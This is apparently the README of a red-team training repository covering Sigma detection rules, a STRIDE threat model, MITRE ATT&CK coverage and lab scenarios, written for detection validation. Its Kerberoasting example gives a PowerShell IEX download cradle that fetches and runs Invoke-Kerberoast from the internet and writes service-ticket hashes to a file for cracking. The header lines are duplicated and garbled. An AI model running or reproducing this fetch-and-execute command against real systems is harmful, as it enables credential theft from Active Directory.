# Red Team Lab - Offensive Security Exercises

**Author:** Poulomi Dwivedi ([@poulomidwivedi-collab](https://github.com/poulomidwivedi-collab))  
**Role:** Senior Security Engineer @ Aviva
**Education:** MBA Innovation (2020, University of London) | MSc Cybersecurity (2024, University of the West of England) | MSc Computer Science (2011) | BSc Computer Science (2008) 
**Location:** Bristol, UK
**Purpose:** Advanced offensive security training, attack simulation, and defense validation in isolated lab environments
**Compliance Context:** All exercises conducted in TEST ENVIRONMENTS ONLY with proper authorization and OPSEC protocols*
*Location:** Bristol, UK  
**Purpose:** Advanced offensive security training, attack simulation, and defense validation in isolated lab environmentsattack simulation, and defense validation in isolated lab environments  
**Compliance Context:** All exercises conducted in TEST ENVIRONMENTS ONLY with proper authorization and OPSEC protocols  

---

## Overview

This directory contains comprehensive red team exercises designed to teach advanced offensive security techniques, MITRE ATT&CK tactics and techniques, and penetration testing methodologies in a controlled, isolated lab environment. All exercises are educational and intended for authorized security professionals and researchers.

**Key Philosophy:** Understand attack methodologies to build better defenses. Every attack technique has a corresponding detection strategy.

### Purpose

- **Learn** attack methodologies using MITRE ATT&CK Framework
- **Practice** payload development, delivery, and evasion techniques
- **Test** defensive controls and detection capabilities against real attack scenarios
- **Understand** attack chains, lateral movement, and persistence mechanisms
- **Develop** OPSEC awareness and operational security best practices
- **Validate** SOC detection coverage and incident response procedures
- **Improve** threat hunting capabilities through adversary emulation

---

## Folder Structure

```
red-team-lab/
├── README.md                           # This file
├── sigma-rules-detection-collection.yaml # 10+ Sigma detection rules for adversary techniques
├── threat-model-stride-analysis.md      # Comprehensive threat modeling using STRIDE methodology
└── [Future: Scenario playbooks, exploitation frameworks, lab documentation]
```

---

## Contents & Resources

### 1. Sigma Rules Detection Collection
**File:** `sigma-rules-detection-collection.yaml`

Production-ready Sigma detection rules covering common red team techniques:

- **Windows Event Log Detection (10+ rules)**
  - Kerberoasting attack detection (Service ticket enumeration)
  - Lateral movement via WinRM
  - Living off the land (LOLBin) techniques
  - PowerShell script block logging evasion
  - Windows Defender exclusion modifications
  - USB device installation exploitation
  - Process injection and hollowing attacks
  - Credential access via LSASS memory dumping
  - Network reconnaissance and enumeration
  - Privilege escalation via token impersonation

**Format:** YAML-based Sigma rules compatible with:
- Sigma rule converters (Elastic, Splunk, Microsoft Sentinel)
- SIEM platforms (Splunk, Elastic, ArcSight)
- EDR solutions (Windows Defender, CrowdStrike, SentinelOne)
- Security orchestration platforms

### 2. STRIDE Threat Model Analysis
**File:** `threat-model-stride-analysis.md`

Comprehensive threat modeling framework covering:

- **Spoofing:** Authentication bypass, credential theft, impersonation
- **Tampering:** Data integrity attacks, log tampering, registry manipulation
- **Repudiation:** Attack attribution evasion, log deletion
- **Information Disclosure:** Data exfiltration, credential dumping, OSINT
- **Denial of Service:** Resource exhaustion, network flooding
- **Elevation of Privilege:** Privilege escalation, kernel exploitation

---

## MITRE ATT&CK Coverage

This red team lab covers the following MITRE ATT&CK tactics:

| Tactic | Techniques | Status | Detection Coverage |
|--------|-----------|--------|-------------------|
| **Reconnaissance** | Network service enumeration, IP space discovery | ✓ | ✓ Sigma rules included |
| **Resource Development** | Malware development, command & control setup | ✓ | ✓ Network-based detection |
| **Initial Access** | Phishing, supply chain compromise | ✓ | ✓ Email gateway detection |
| **Execution** | PowerShell, WMI, Windows Task Scheduler | ✓ | ✓ Process execution monitoring |
| **Persistence** | Registry run keys, scheduled tasks, WMI event subscriptions | ✓ | ✓ Sigma rules + endpoint detection |
| **Privilege Escalation** | Token impersonation, kernel exploit, UAC bypass | ✓ | ✓ Behavioral detection |
| **Defense Evasion** | Masquerading, obfuscation, log tampering | ✓ | ✓ Multi-layer detection |
| **Credential Access** | Kerberoasting, credential dumping, brute force | ✓ | ✓ Active Directory monitoring |
| **Discovery** | Network share enumeration, account discovery | ✓ | ✓ LDAP query monitoring |
| **Lateral Movement** | Pass-the-hash, WinRM, SMB exploitation | ✓ | ✓ Network segmentation + detection |
| **Collection** | Data staging, screen capture, browser history | ✓ | ✓ File access monitoring |
| **Exfiltration** | Data transfer via DNS, HTTP, FTP | ✓ | ✓ DLP + network detection |
| **Command & Control** | C2 beaconing, DNS tunneling, dead drop resolvers | ✓ | ✓ Network-based detection |
| **Impact** | Data destruction, system shutdown, resource hijacking | ✓ | ✓ Alert-based response |

---

## Lab Environment Requirements

### Hardware
- **Minimum:** 8 CPU cores, 16GB RAM, 200GB storage
- **Recommended:** 16 CPU cores, 32GB RAM, 500GB SSD
- **Virtualization:** VMware, Hyper-V, or KVM with isolated network segment

### Software Stack
- **Hypervisor:** VMware ESXi / Hyper-V / KVM
- **Target Systems:** Windows Server 2019/2022, Windows 10/11 workstations
- **Monitoring:** Splunk, ELK Stack, or Azure Sentinel
- **Agent Deployment:** Sysmon, Winlogbeat, Splunk UF
- **Attack Frameworks:** Cobalt Strike, Metasploit, Empire, Sliver
- **Utilities:** Sysinternals suite, PowerShell, Mimikatz (educational)

### Network Isolation
- **Separate VLAN:** Isolated from production networks
- **Air-gapped option:** Completely disconnected from external networks
- **Monitoring:** All network traffic captured and logged
- **Egress control:** Restricted outbound connectivity

---

## Attack Scenarios & Playbooks

### Scenario 1: Kerberoasting Campaign
**Objective:** Extract and crack Kerberos tickets from service accounts  
**Timeline:** 2-3 hours  
**Tactics:** Credential Access (T1558.003), Discovery (T1018)  
**Detection Focus:** Service account ticket enumeration, failed authentication attempts

### Scenario 2: Lateral Movement via Pass-the-Hash
**Objective:** Move from compromised workstation to sensitive servers  
**Timeline:** 3-4 hours  
**Tactics:** Lateral Movement (T1550.002), Credential Access (T1003.001)  
**Detection Focus:** NTLM relay attacks, SMB signing bypass, mimikatz execution patterns

### Scenario 3: Persistence via Scheduled Tasks
**Objective:** Establish long-term presence via malicious scheduled tasks  
**Timeline:** 1-2 hours  
**Tactics:** Persistence (T1053.005), Execution (T1053.005)  
**Detection Focus:** Unusual task creation, system utility modification, registry persistence

### Scenario 4: Defense Evasion & Living Off the Land
**Objective:** Maintain access while avoiding detection using native tools  
**Timeline:** 4-5 hours  
**Tactics:** Defense Evasion (T1036), Execution (T1059.001)  
**Detection Focus:** PowerShell script block logging, process network connections, parent-child relationships

---

## Getting Started

### Prerequisites
```bash
# Verify network isolation
ping 8.8.8.8  # Should fail in lab environment

# Check monitoring agents
Get-Service WinlogBeat
Get-Service Sysmon

# Verify SIEM ingestion
# Login to Splunk/Sentinel and confirm event collection from lab hosts
```

### Example: Running Kerberoasting Detection
```powershell
# On attack VM
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | Out-File hashes.txt

# Expected detections in SIEM:
# - EventID 13: Registry access (Kerberoast indicators)
# - EventID 4768: TGT request for service account
# - EventID 4769: Service ticket request
# - PowerShell script execution from unusual path
```

---

## Detection & Response Validation

After each attack scenario, validate that:

1. **SIEM captured all relevant events** (~50-100 logs per scenario)
2. **Sigma rules triggered** (confirm alert generation)
3. **Alert fatigue is minimal** (low false positive rate)
4. **Incident response procedures followed** (manual investigation)
5. **Forensic artifacts preserved** (logs, memory dumps, disk images)

---

## OPSEC Best Practices

### During Lab Exercises
- ✓ Use isolated lab environment only
- ✓ Disable internet access to lab VMs
- ✓ Document all actions taken
- ✓ Use unique naming conventions for lab artifacts
- ✓ Preserve logs before lab cleanup

### Strictly Prohibited
- ✗ Testing against production systems
- ✗ Unauthorized access to networks
- ✗ Malware creation for distribution
- ✗ Sharing attack techniques outside authorized team
- ✗ Any unauthorized computer access

---

## Tools & Frameworks

### Authorized Tools (Lab Use Only)
- **Cobalt Strike** - Commercial command & control framework
- **Metasploit** - Open-source exploitation framework
- **Empire** - PowerShell-based post-exploitation framework
- **Sliver** - Modern C2 alternative to Cobalt Strike
- **Mimikatz** - Educational credential dumping tool
- **BloodHound** - Active Directory security analysis
- **Impacket** - Python library for network protocol manipulation

### Detection & Analysis
- **Sigma** - Generic signature format for SIEM rules
- **YARA** - Malware identification and classification
- **Volatility** - Memory forensics analysis
- **Splunk** - SIEM platform with advanced analytics
- **Microsoft Sentinel** - Cloud-native SIEM/SOAR

---

## Incident Response Procedures

### If Accidental Production Access Occurs
1. **IMMEDIATELY stop** all activities
2. **Document** the exact time and actions taken
3. **Notify** your security officer
4. **Disconnect** from network
5. **Do NOT delete** any logs or evidence
6. **Preserve** memory dump and disk image for analysis

---

## References & Further Reading

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Sigma Rule Documentation](https://sigma.readthedocs.io/)
- [SpecterOps Blog](https://posts.specterops.io/) - Advanced threat research
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls](https://www.cisecurity.org/controls)

---

## Contributing & Questions

See [CONTRIBUTING.md](../CONTRIBUTING.md) for guidelines on contributing new attack scenarios or detection rules.

**Author Bio:** MSc Cybersecurity (completed, University of the West of England), Detection Engineering specialist at Aviva, experienced in SIEM administration, threat modeling, incident response, and red team operations.
---

## License

MIT License - See [LICENSE](../LICENSE) file

*Last Updated: January 2026*  
*Educational & Training Use Only - Authorized Personnel Only*
